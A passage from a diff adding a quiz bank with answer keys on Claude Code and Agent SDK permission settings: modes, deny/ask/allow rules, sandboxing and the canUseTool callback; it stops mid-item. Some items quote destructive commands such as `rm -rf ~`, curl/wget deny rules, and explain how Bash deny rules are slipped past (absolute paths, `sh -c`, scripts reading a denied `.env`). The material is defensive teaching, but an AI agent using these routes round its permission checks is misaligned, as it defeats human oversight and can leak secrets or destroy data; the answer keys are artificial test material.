+        "https://github.com/apiad/aegis/issues/52",
+        "https://code.claude.com/docs/en/agent-sdk/permissions"
+      ]
+    },
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-021",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "single",
+    "select": 1,
+    "stem": "A Python agent is configured with `allowed_tools=['Read']` and `permission_mode='bypassPermissions'`. The author expects Claude to be limited to reading. Claude runs `rm -rf dist` through Bash. What happens, and what would have limited it?",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "It runs; `allowed_tools` does not constrain bypass mode, so use `disallowed_tools` or `tools` to restrict Bash",
+        "why": "Unlisted tools reach the mode step, where bypassPermissions approves them; only deny rules, ask rules and hooks come earlier."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "It is blocked, because tools not listed in `allowed_tools` are unavailable",
+        "why": "allowed_tools only pre-approves the listed tools; unlisted tools still exist."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "It goes to `can_use_tool`, because only `Read` is pre-approved",
+        "why": "Unlisted tools fall through to the permission mode, and bypassPermissions approves them there."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "It runs, but only because `rm` is in the acceptEdits filesystem list; other Bash commands such as `curl` would still be blocked",
+        "why": "bypassPermissions approves every tool that reaches the mode step, not only filesystem commands."
+      }
+    ],
+    "explanation": "`allowed_tools` adds allow rules; it is not a whitelist. In `bypassPermissions`, any tool not matched by an allow rule falls through to the mode, which approves it, so `allowed_tools=['Read']` still lets Bash, Write and Edit run. Use deny rules, the `tools` option, or a different mode to actually restrict the surface.",
+    "reference": "Agent SDK docs: Configure permissions (Allow and deny rules)",
+    "source": "interview:bypass-permissions-sdk",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/agent-sdk/typescript",
+        "https://easyinterview.me/blogs/the-interview-questions-that-matter/claude-code-interview-guide",
+        "https://eseospace.com/blog/claude-code-developer-interview-questions/"
+      ]
+    },
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-022",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "multi",
+    "select": 2,
+    "stem": "An agent runs in `bypassPermissions` mode inside a container. Which of these tool calls are still NOT auto-approved by the mode? (Choose two.)",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "A Bash call matching an explicit ask rule `Bash(git push *)`",
+        "why": "Ask rules are evaluated before the mode and send the call to the callback even in bypassPermissions."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "A call to the `AskUserQuestion` tool",
+        "why": "Tools that require user interaction always fall through to the callback, whatever the mode."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "A Write to `.git/hooks/pre-commit`",
+        "why": "Writes to protected paths such as `.git` are prompted in other modes but are allowed in bypassPermissions."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "An Edit to a file outside the working directory",
+        "why": "Outside-scope edits are an acceptEdits limit; bypassPermissions approves them."
+      },
+      {
+        "id": "E",
+        "correct": false,
+        "text": "A WebFetch to a domain no rule mentions",
+        "why": "bypassPermissions skips the WebFetch prompt unless an explicit ask rule matches the domain."
+      }
+    ],
+    "explanation": "No mode, including `bypassPermissions`, auto-approves: calls matched by an explicit ask rule, tools that need user interaction (`AskUserQuestion`, MCP tools marked `requiresUserInteraction`), organisation-set `ask` connector tools, and recognised `rm`/`rmdir` critical-path removals. Protected-path writes, by contrast, are allowed in bypass mode.",
+    "reference": "Claude Code docs: Choose a permission mode (Actions no mode auto-approves)",
+    "source": "interview:actions-no-mode-approves",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/permission-modes",
+        "https://code.claude.com/docs/en/agent-sdk/permissions"
+      ]
+    },
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-023",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "single",
+    "select": 1,
+    "stem": "An SDK agent runs in `acceptEdits` mode, and `.claude/settings.json` contains the allow rule `Edit(.husky/**)`. Claude writes `.husky/pre-commit` inside the working directory. What happens?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "It is auto-approved, because the path is inside the working directory and acceptEdits approves all edits there",
+        "why": "acceptEdits excludes writes to protected paths even inside the working directory."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "It is auto-approved, because the settings allow rule pre-approves it",
+        "why": "Allow rules in settings files do not pre-approve protected-path writes; the safety check runs first."
+      },
+      {
+        "id": "C",
+        "correct": true,
+        "text": "It is not auto-approved; `.husky` is a protected path, so the write goes to the approval step (`canUseTool`)",
+        "why": "Protected-path writes are prompted in default and acceptEdits, regardless of settings allow rules."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "It is denied outright with no chance to approve, as in dontAsk",
+        "why": "Outright denial of protected-path writes is the dontAsk behaviour, not acceptEdits."
+      }
+    ],
+    "explanation": "Claude Code protects a set of paths such as `.git`, `.husky`, `.vscode`, most of `.claude`, and files like `.bashrc`, `.npmrc` and `.mcp.json`. Writes there are prompted in `default` and `acceptEdits`, routed to the classifier in `auto`, denied in `dontAsk`, and allowed only in `bypassPermissions`. Settings allow rules do not change that outcome.",
+    "reference": "Claude Code docs: Choose a permission mode (Protected paths)",
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-024",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "single",
+    "select": 1,
+    "stem": "A developer adds the deny rule `Read(/secrets/**)` to `~/.claude/settings.json`, intending to block every project's `secrets/` folder. Claude can still read `./secrets/prod.json` in a project. Why?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "Deny rules in user settings are overridden by allow rules in the project's `.claude/settings.json`, which load later",
+        "why": "A deny at any level blocks; a project allow cannot override a user deny."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "A single leading `/` anchors at the settings source, so in user settings the rule means `~/.claude/secrets/**`",
+        "why": "In user settings `/path` resolves under `~/.claude/`; it is neither the filesystem root nor the project."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "Read deny rules only apply to the Read tool, and Claude used Grep",
+        "why": "Claude Code applies Read rules to Grep and Glob too, on a best-effort basis."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "Rules with `**` need a matching `Read(/secrets)` rule for the directory itself",
+        "why": "No companion rule is needed; the anchor is what is wrong."
+      }
+    ],
+    "explanation": "Read and Edit rules have four anchors: `//path` (filesystem root), `~/path` (home), `/path` (relative to the settings source: the project root for project settings, `~/.claude` for user settings) and `path` or `./path` (current directory). To block a folder in every project from user settings, use a pattern such as `Read(**/secrets/**)`, a `~/` path or a `//` absolute path.",
+    "reference": "Claude Code docs: Configure permissions (Where a pattern anchors)",
+    "source": "interview:protect-secrets-deny-rules",
+    "asked": {
+      "frequency": "very-common",
+      "evidence": [
+        "https://eseospace.com/blog/claude-code-developer-interview-questions/",
+        "https://easyinterview.me/blogs/the-interview-questions-that-matter/claude-code-interview-guide",
+        "https://code.claude.com/docs/en/permissions",
+        "https://code.claude.com/docs/en/agent-sdk/secure-deployment"
+      ]
+    },
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-025",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "single",
+    "select": 1,
+    "stem": "In a security review, an agent's only egress control is the deny list `Bash(curl *)` and `Bash(wget *)`. What is the strongest critique?",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "Bash rules match command text, so `/usr/bin/curl` or `sh -c 'curl ...'` slip through; enforce egress with the sandbox or the container",
+        "why": "A Bash rule covers the form Claude usually writes and is not a security boundary around the program."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "Deny rules are skipped in `acceptEdits` mode, so the list only works in `default`",
+        "why": "Deny rules apply in every mode, including bypassPermissions."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "The rules should be `ask` rules, because deny rules cannot match Bash arguments",
+        "why": "Deny rules can match Bash commands; the issue is what the text match misses."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "WebFetch must also be denied in the same file, otherwise Claude Code ignores Bash rules that target network tools such as curl",
+        "why": "Bash rules do not depend on WebFetch rules; but denying curl alone does not stop other network paths."
+      }
+    ],
+    "explanation": "A Bash rule matches the command text after splitting compound commands and stripping known wrappers. It does not match the same program by absolute path, inside `sh -c`, or in another language. For network enforcement that does not depend on the command text, use the sandbox's `allowedDomains` proxy (or container-level egress control), and use `WebFetch(domain:...)` rules for the fetch tool.",
+    "reference": "Claude Code docs: Configure permissions (What a Bash rule doesn't match)",
+    "roleLevel": 4
+  },
+  {
+    "id": "CSK-PRM-026",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "match",
+    "select": 1,
+    "stem": "Match each SDK permission mode with how it treats a tool call that needs approval and matches no allow rule.",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "`default`",
+        "why": "No mode-based approvals; unresolved calls go to `canUseTool`."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`dontAsk`",
+        "why": "Never prompts; anything that would prompt is denied."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`plan`",
+        "why": "Explore and plan; edits always go to the callback."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`auto`",
+        "why": "A classifier model reviews actions before they run."
+      }
+    ],
+    "prompts": [
+      {
+        "id": "P1",
+        "text": "The call is passed to your `canUseTool` callback",
+        "answer": "A"
+      },
+      {
+        "id": "P2",
+        "text": "The call is denied without the callback ever being called",
+        "answer": "B"
+      },
+      {
+        "id": "P3",
+        "text": "A file edit goes to `canUseTool` even if an allow rule or a `PreToolUse` hook allows it",
+        "answer": "C"
+      },
+      {
+        "id": "P4",
+        "text": "A separate model decides whether a shell command or network request may run",
+        "answer": "D"
+      }
+    ],
+    "explanation": "In `default`, calls that need approval and match no allow rule reach `canUseTool`. `dontAsk` denies them without calling it. `plan` never auto-approves file edits, even with an allow rule or a hook allow. `auto` sends shell commands, network requests and similar actions to a classifier that allows or blocks each one.",
+    "reference": "Agent SDK docs: Configure permissions (Available modes)",
+    "source": "interview:permission-modes",
+    "asked": {
+      "frequency": "very-common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://www.interviewcoder.co/blog/claude-code-interview-questions",
+        "https://eseospace.com/blog/claude-code-developer-interview-questions/",
+        "https://code.claude.com/docs/en/permission-modes",
+        "https://code.claude.com/docs/en/agent-sdk/permissions"
+      ]
+    },
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-027",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "single",
+    "select": 1,
+    "stem": "`Read(./.env)` is in the deny list. Claude runs `python scripts/load_config.py`, a project script that opens `.env` and prints its values. What happens, and how do you actually stop it?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "The script fails, because Read deny rules apply to every process Claude starts",
+        "why": "Read rules cover built-in file tools and file commands Claude Code recognises in Bash, not files a script opens itself."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "Claude Code blocks the Bash call, because it traces the files a script opens and finds the denied `.env` path",
+        "why": "Claude Code does not inspect what a script will open; it only matches the command text and known file commands."
+      },
+      {
+        "id": "C",
+        "correct": true,
+        "text": "The secrets are printed; Read rules don't cover subprocesses, so use the sandbox's `filesystem.denyRead`",
+        "why": "OS-level enforcement through the sandbox applies to every process a sandboxed command starts."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "The secrets are printed; fix it by adding `Edit(./.env)` to the deny list as well",
+        "why": "An Edit deny blocks writes by file tools; it has no effect on a script reading the file."
+      }
+    ],
+    "explanation": "Read and Edit deny rules apply to the built-in file tools, to file commands Claude Code recognises in Bash (`cat`, `head`, `tail`, `sed`, `tee`) and to redirect targets. They do not apply to subprocesses that open files themselves, such as a Python or Node script. For that you need the sandbox, which the OS enforces on the running command and its children.",
+    "reference": "Claude Code docs: Configure permissions (Read and Edit)",
+    "source": "interview:protect-secrets-deny-rules",
+    "asked": {
+      "frequency": "very-common",
+      "evidence": [
+        "https://eseospace.com/blog/claude-code-developer-interview-questions/",
+        "https://easyinterview.me/blogs/the-interview-questions-that-matter/claude-code-interview-guide",
+        "https://code.claude.com/docs/en/permissions",
+        "https://code.claude.com/docs/en/agent-sdk/secure-deployment"
+      ]
+    },
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-028",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "multi",
+    "select": 2,
+    "stem": "Which statements about the `canUseTool` callback are correct? (Choose two.)",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "It can stay pending indefinitely; execution is paused until it returns",
+        "why": "There is no built-in timeout, so the agent waits for your decision."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "The `message` in a deny result is shown to Claude, which may change its approach",
+        "why": "Claude reads the deny message, so it can carry guidance such as a suggested alternative."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "When it returns a modified `updatedInput`, Claude is told that the input was changed",
+        "why": "Claude sees the tool result but is not told you changed anything."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "It is called for every tool call, including calls approved by `allowedTools`",
+        "why": "Calls approved earlier in the flow never reach the callback."
+      },
+      {
+        "id": "E",
+        "correct": false,
+        "text": "In `dontAsk` mode it is called as a last resort before a call is denied",
+        "why": "dontAsk skips the callback step and denies the call directly."
+      }
+    ],
+    "explanation": "`canUseTool` is the last step of the evaluation flow and fires only for calls nothing earlier resolved. It can wait as long as needed (for long waits, a `PreToolUse` hook returning `defer` lets the process exit and resume later). Deny messages reach Claude; modified inputs run silently.",
+    "reference": "Agent SDK docs: Handle approvals and user input",
+    "source": "interview:can-use-tool-callback",
+    "asked": {
+      "frequency": "very-common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://code.claude.com/docs/en/agent-sdk/permissions",
+        "https://code.claude.com/docs/en/agent-sdk/user-input",
+        "https://github.com/anthropics/claude-agent-sdk-typescript/issues/470"
+      ]
+    },
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-029",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "multi",
+    "select": 2,
+    "stem": "An agent enables the sandbox with `filesystem.denyRead` covering `~/.aws`. Which of these still run outside the OS sandbox boundary? (Choose two.)",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "A `Read` tool call on `~/.aws/credentials`",
+        "why": "Built-in file tools follow permission rules, not the sandbox; a denyRead entry does not stop the Read tool."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "A command hook or a local stdio MCP server process",
+        "why": "Hooks and local MCP servers are processes Claude Code starts outside the sandbox, with full user access."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`npm test` run through the Bash tool",
+        "why": "Shell commands Claude runs through Bash start inside the sandbox."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "A child process started by a sandboxed Bash command",
+        "why": "The sandbox applies to the processes a sandboxed command starts as well."
+      },
+      {
+        "id": "E",
+        "correct": false,
+        "text": "A command run by the `Monitor` tool",
+        "why": "The sandbox covers Bash, PowerShell and Monitor commands."
+      }
+    ],
+    "explanation": "The Bash sandbox wraps shell commands (Bash, PowerShell, Monitor) and their children. Built-in tools such as Read, Edit, Write and WebFetch follow permission rules instead, so pair `denyRead` with a `Read(...)` deny rule. Hooks, local MCP servers and similar helpers run with full access; to cover them, run the whole Claude Code process in a container or VM.",
+    "reference": "Claude Code docs: Configure the sandboxed Bash tool (What runs outside the sandbox)",
+    "source": "interview:sandbox-option",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/sandboxing",
+        "https://code.claude.com/docs/en/agent-sdk/python",
+        "https://github.com/anthropics/claude-agent-sdk-typescript/blob/main/CHANGELOG.md"
+      ]
+    },
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-030",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "truefalse",
+    "select": 1,
+    "stem": "With the sandbox enabled and `autoAllowBashIfSandboxed` left at its default of `true`, a content-scoped ask rule such as `Bash(git push *)` still forces an approval for a sandboxed `git push`.",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "True",
+        "why": "Correct: auto-allow replaces only the whole-tool prompt; content-scoped ask rules still apply."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "False",
+        "why": "Auto-allow skips a bare `Bash` ask rule for sandboxed commands, but not ask rules that match command content."
+      }
+    ],
+    "explanation": "In auto-allow mode sandboxed commands run without a prompt, and a bare `Bash` (or `Bash(*)`) ask rule is skipped for them. Deny rules still block, content-scoped ask rules like `Bash(git push *)` still prompt, and recognised critical-path removals still go through the normal flow.",
+    "reference": "Claude Code docs: Configure the sandboxed Bash tool (Auto-allow mode)",
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-031",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "single",
+    "select": 1,
+    "stem": "An agent has `allowedTools: ['mcp__*']` so that all MCP tools run without approval, yet every call to `mcp__github__list_issues` still reaches `canUseTool`. Why?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "MCP tools can only be approved through the server's own config, not through allow rules",
+        "why": "Allow rules do approve MCP tools when written in a supported form."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "The rule needs a trailing space before the wildcard, as in Bash rules: `mcp__ *`",
+        "why": "Bash spacing rules do not apply to tool-name globs."
+      },
+      {
+        "id": "C",
+        "correct": true,
+        "text": "Unanchored allow globs are ignored; allow globs need a literal `mcp__<server>__` prefix, such as `mcp__github__*`",
+        "why": "The server segment must be glob-free so the rule names a server you configured."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "Allow rules for MCP tools only take effect when they come from `settings.json`, not from `allowedTools` in the query options",
+        "why": "allowedTools entries are allow rules like any other; the problem is the unanchored glob."
+      }
+    ],
+    "explanation": "Deny and ask rules accept tool-name globs such as `*` and `mcp__*`. Allow rules accept globs only after a literal `mcp__<server>__` prefix, so `mcp__github__*` or `mcp__github__get_*` work, while `*` and `mcp__*` in an allow list are skipped and approve nothing. This stops one broad rule from silently approving every server's tools.",
+    "reference": "Agent SDK docs: Configure permissions (Allow and deny rules)",
+    "source": "interview:permission-rule-syntax",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/permissions",
+        "https://code.claude.com/docs/en/agent-sdk/python",
+        "https://easyinterview.me/blogs/the-interview-questions-that-matter/claude-code-interview-guide"
+      ]
+    },
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-032",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "fill",
+    "select": 1,
+    "stem": "A team writes the allow rule `Write(docs/**)`, but Write calls under `docs/` still need approval, because Claude Code never matches path rules written for `Write`. Which tool name should the path rule use instead? Type the tool name.",
+    "options": [],
+    "accepted": [
+      "Edit",
+      "`Edit`",
+      "Edit(docs/**)",
+      "edit"
+    ],
+    "explanation": "Claude Code checks file permissions against `Edit(path)` and `Read(path)` rules only. `Edit(path)` rules govern every built-in tool that writes files, including Write and NotebookEdit, so use `Edit(docs/**)`. `Write(path)`, `NotebookEdit(path)` and `Glob(path)` rules are accepted but never matched; use `Read(path)` in place of `Glob(path)`.",
+    "reference": "Claude Code docs: Configure permissions (Write, NotebookEdit and Glob rules never match)",
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-033",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "order",
+    "select": 1,
+    "stem": "Put the Agent SDK's permission evaluation steps in the order they are checked for a tool call.",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "Hooks (`PreToolUse`)",
+        "why": ""
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "Deny rules",
+        "why": ""
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "Ask rules",
+        "why": ""
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "Permission mode",
+        "why": ""
+      },
+      {
+        "id": "E",
+        "correct": false,
+        "text": "Allow rules",
+        "why": ""
+      },
+      {
+        "id": "F",
+        "correct": false,
+        "text": "`canUseTool` callback",
+        "why": ""
+      }
+    ],
+    "answerOrder": [
+      "A",
+      "B",
+      "C",
+      "D",
+      "E",
+      "F"
+    ],
+    "explanation": "Hooks run first and can deny or pass the call on (a hook allow does not skip the deny and ask rules). Deny rules block even in bypass mode. Ask rules send the call to the callback even in bypass mode. Then the mode applies (bypass approves, acceptEdits approves file operations, plan routes writes to the callback), then allow rules, and finally `canUseTool` for anything still unresolved (skipped in `dontAsk`).",
+    "reference": "Agent SDK docs: Configure permissions (How permissions are evaluated)",
+    "source": "interview:permission-evaluation-order",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://code.claude.com/docs/en/agent-sdk/permissions",
+        "https://github.com/mario-andreschak/FLUJO/issues/1092"
+      ]
+    },
+    "roleLevel": 4
+  },
+  {
+    "id": "CSK-PRM-034",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "single",
+    "select": 1,
+    "stem": "An SDK session runs in `bypassPermissions` (with `allowDangerouslySkipPermissions: true`) and registers a `canUseTool` callback. A `PreToolUse` hook returns `allow` for every Bash call, and project settings contain the ask rule `Bash(git push *)`. Claude runs `git push origin main`. What happens?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "It runs immediately, because the hook's allow resolves the call before any rule is checked",
+        "why": "A hook allow does not skip the deny and ask rules, which are evaluated regardless of the hook result."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "It runs immediately, because bypassPermissions approves everything that is not denied",
+        "why": "The ask rule is checked before the mode step, so bypass never gets to approve this call."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "It is denied, because the ask rule cannot prompt anyone in bypass mode",
+        "why": "Denying instead of prompting is the dontAsk behaviour; here the callback exists and is asked."
+      },
+      {
+        "id": "D",
+        "correct": true,
+        "text": "It is sent to `canUseTool` for a decision",
+        "why": "A matching ask rule falls through to the callback even in bypassPermissions, and the hook allow does not change that."
+      }
+    ],
+    "explanation": "Order matters: hooks, deny rules, ask rules, mode, allow rules, `canUseTool`. A hook can deny outright, but its allow does not bypass deny or ask rules. A matching ask rule routes the call to the callback even in `bypassPermissions` (in `dontAsk` it would be denied instead).",
+    "reference": "Agent SDK docs: Configure permissions (How permissions are evaluated)",
+    "source": "interview:permission-evaluation-order",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://code.claude.com/docs/en/agent-sdk/permissions",
+        "https://github.com/mario-andreschak/FLUJO/issues/1092"
+      ]
+    },
+    "roleLevel": 4
+  },
+  {
+    "id": "CSK-PRM-035",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "single",
+    "select": 1,
+    "stem": "An SDK session runs with `permissionMode: 'auto'`, an allow rule `Bash(rm *)` and a `canUseTool` callback. Claude runs `rm -rf ~`. What happens?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "It runs, because the allow rule matches before the classifier is consulted",
+        "why": "No allow rule approves a recognised critical-path removal, and the home directory is a critical path."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "The classifier reviews it, blocks it as destructive, and Claude receives the classifier's matched rule as the reason",
+        "why": "By default the classifier does not review recognised critical-path removals."
+      },
+      {
+        "id": "C",
+        "correct": true,
+        "text": "It is denied immediately without calling `canUseTool`, and Claude is told to report what it wanted to delete",
+        "why": "In SDK sessions auto mode denies recognised critical-path removals outright."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`canUseTool` is called so a human can confirm",
+        "why": "Without a terminal to prompt in, auto mode denies these removals without calling the callback."
+      }
+    ],
+    "explanation": "Critical paths include the filesystem root, its top-level directories, your home directory, and the working directory and its parents. No allow rule or `PreToolUse` allow approves a recognised `rm`/`rmdir` of one. In `auto` mode, wherever Claude Code cannot show a terminal prompt (including `-p` runs and Agent SDK sessions) it denies the command immediately. The check can miss some commands, so it does not replace sandboxing.",
+    "reference": "Claude Code docs: Choose a permission mode (Critical paths)",
+    "source": "interview:actions-no-mode-approves",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/permission-modes",
+        "https://code.claude.com/docs/en/agent-sdk/permissions"
+      ]
+    },
+    "roleLevel": 4
+  },
+  {
+    "id": "CSK-PRM-036",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "multi",
+    "select": 2,
+    "stem": "A TypeScript agent in `default` mode registers `canUseTool` and sets `allowedTools: ['Read', 'Bash(npm test *)', 'mcp__github__get_issue', 'WebFetch(domain:docs.python.org)', 'Bash(git status)']`. For which tools will the callback never see a call, apart from the actions no mode auto-approves? (Choose two.)",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "`Read`",
+        "why": "A bare tool name auto-approves every call to that tool (apart from network-path reads and the no-mode exceptions), so the callback is shadowed for Read."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "`mcp__github__get_issue`",
+        "why": "A bare MCP tool name works the same way as a bare built-in name: every call is approved before the callback."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`Bash`",
+        "why": "Only matching Bash calls are approved by scoped rules; other Bash commands that need approval still reach the callback."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`WebFetch`",
+        "why": "The domain rule approves fetches to that domain only; fetches elsewhere still need approval."
+      },
+      {
+        "id": "E",
+        "correct": false,
+        "text": "None of them, because `canUseTool` takes precedence over `allowedTools`",
+        "why": "Allow rules are checked before the callback, so they shadow it."
+      }
+    ],
+    "explanation": "Coverage depends on the entry's form. A bare name such as `Read` or `mcp__github__get_issue` auto-approves the whole tool, so the callback never sees it; the TypeScript SDK emits a `CLAUDE_SDK_CAN_USE_TOOL_SHADOWED` process warning for bare entries (Python: `CanUseToolShadowedWarning`). Scoped entries such as `Bash(npm test *)` approve only matching calls, and other calls still fall through to the callback.",
+    "reference": "Agent SDK docs: Configure permissions (How permissions are evaluated)",
+    "source": "interview:can-use-tool-bypassed",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://github.com/anthropics/claude-agent-sdk-typescript/issues/493",
+        "https://github.com/apiad/aegis/issues/52",
+        "https://code.claude.com/docs/en/agent-sdk/permissions"
+      ]
+    },
+    "roleLevel": 4
+  },
+  {
+    "id": "CSK-PRM-037",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "multi",
+    "select": 2,
+    "stem": "A nightly CI agent reviews a repository. It may read files and run read-only commands plus exactly `npm test`; it must not modify files or run anything else; no human is available and the job must never hang waiting for approval. Which two settings together satisfy every constraint? (Choose two.)",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "`permissionMode: 'dontAsk'`",
+        "why": "Anything that would prompt is denied instead, so nothing can block on an approval and nothing unlisted runs."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "`allowedTools: ['Read', 'Glob', 'Grep', 'Bash(npm test)']`",
+        "why": "This pre-approves exactly the needed tools; reads and read-only commands need no approval anyway."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`permissionMode: 'bypassPermissions'` with `allowDangerouslySkipPermissions: true`",
+        "why": "allowedTools does not constrain bypass, so every tool, including Write and arbitrary Bash, would be approved."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`permissionMode: 'acceptEdits'`",
+        "why": "acceptEdits auto-approves file edits and filesystem commands, which breaks the no-modification rule."
+      },
+      {
+        "id": "E",
+        "correct": false,
+        "text": "A `canUseTool` callback that posts to Slack and awaits a reply",
+        "why": "There is no human available, and a pending callback pauses the run indefinitely."
+      },
+      {
+        "id": "F",
+        "correct": false,
+        "text": "`permissionMode: 'auto'`",
+        "why": "The classifier could approve commands other than npm test, so the surface is not exactly the one specified."
+      }
+    ],
+    "explanation": "The documented locked-down pattern pairs `allowedTools` with `permissionMode: 'dontAsk'`: listed tools are approved, calls that need no approval (file reads in the working directories, read-only Bash) run, and every other call that would prompt is denied without waiting. This fails closed, unlike bypass (no restriction) or a callback (needs someone to answer).",
+    "reference": "Agent SDK docs: Configure permissions (Allow and deny rules)",
+    "source": "interview:dontask-mode",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://code.claude.com/docs/en/permission-modes",
+        "https://code.claude.com/docs/en/headless"
+      ]
+    },
+    "roleLevel": 4
+  },
+  {
+    "id": "CSK-PRM-038",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "single",
+    "select": 1,
+    "stem": "A TypeScript session in `auto` mode calls `setModel()` to switch to a model that auto mode does not support, then later calls `setModel()` to switch back to a supported model. Tool calls now reach `canUseTool` instead of the classifier. Why?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
